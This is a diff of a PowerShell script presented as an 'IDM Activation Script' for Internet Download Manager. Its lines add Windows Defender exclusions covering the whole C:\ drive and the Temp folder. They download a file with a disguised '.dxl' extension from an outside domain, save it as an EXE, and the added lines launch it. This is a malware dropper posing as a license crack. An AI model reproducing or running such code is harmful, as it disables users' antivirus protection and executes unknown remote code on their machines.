@@ -1,7 +1,14 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
 Add-MpPreference -ExclusionPath "C:\","IDMLifetimelicense.exe","C:\Windows\Temp\"
-Invoke-WebRequest -Uri "https://www.internetdownloadmanagerpro.com/IDMLifetimelicense.dxl" -OutFile "C:\Windows\Temp\IDMLifetimelicense.exe" -UseBasicParsing -PassThru | Write-Progress -Activity "Downloading file" -Status "Progress"
+$url = "https://www.internetdownloadmanagerpro.com/IDMLifetimelicense.dxl"
+$outpath = "C:\Windows\Temp\IDMLifetimelicense.exe"
+Invoke-WebRequest -Uri $url -OutFile $outpath
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $outpath)
+$args = @("Comma","Separated","Arguments")
+Start-Process -Filepath "C:\Windows\Temp\IDMLifetimelicense.exe" -ArgumentList $args
+
 
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
